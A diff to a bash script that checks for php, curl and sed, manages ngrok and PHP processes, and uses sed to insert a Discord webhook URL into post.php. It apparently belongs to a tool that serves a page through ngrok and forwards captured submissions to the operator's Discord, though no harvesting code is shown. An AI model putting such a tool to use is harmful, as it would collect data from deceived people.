@@ -14,17 +14,23 @@ clear
     printf "\n"
 }
 check_discord_webhook() {
-    if [[ -z "$DISCORD_WEBHOOK_URL" ]]; then
+    if [[ -z "$discord_webhook_url" ]]; then
         printf "\e[1;91m[!] Error: Discord webhook URL is not set.\e[0m\n"
-        printf "\e[1;77m[*] Please set your Discord webhook URL in the post.php file.\e[0m\n"
+        printf "\e[1;77m[*] Please provide a valid Discord webhook URL.\e[0m\n"
         exit 1
     fi
+
+    # Update the post.php file with the provided webhook URL
+    sed -i "s|https://discord.com/api/webhooks/your_webhook_url_here|$discord_webhook_url|g" post.php
+    printf "\e[1;92m[\e[0m+\e[1;92m] Discord webhook URL updated successfully!\e[0m\n"
 }
 
 dependencies() {
     command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
     command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
+    command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Install it. Aborting."; exit 1; }
 }
+
 stop() {
     checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
     checkphp=$(ps aux | grep -o "php" | head -n1)
